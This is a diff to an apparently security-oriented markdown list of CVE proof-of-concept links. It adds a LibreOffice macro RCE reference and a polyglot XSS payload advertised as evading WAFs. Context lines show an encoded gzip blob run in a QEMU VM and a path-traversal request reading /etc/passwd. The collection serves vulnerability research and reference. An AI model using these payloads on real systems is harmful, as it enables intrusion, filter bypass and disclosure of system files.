@@ -157,6 +157,7 @@ Some CVEs PoCs repos on github or internet.
   - [CVE-2019-5786](https://github.com/exodusintel/CVE-2019-5786): FileReader Exploit
 - [Google Books X-Hacking](https://medium.com/@terjanq/google-books-x-hacking-29c249862f19)
 - Ruby on Rails: File Content Disclosure on Rails - [CVE-2019-5418](https://github.com/mpgn/CVE-2019-5418)
+- Libreoffice - Remote Code Execution via Macro/Event execution: [CVE-2018-16858](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)
 
 '''bash
 $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
@@ -167,6 +168,14 @@ $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | ba
 ```bash
 GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
 ```
+
+- Web/Javscript/WAF [Payload will run in a lot of contexts](): Short but lethal. No script tags, thus bypassing a lot of WAF and executes in multiple environments.
+
+
+```javascript
+javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+```
+
 
 ## Additions
 
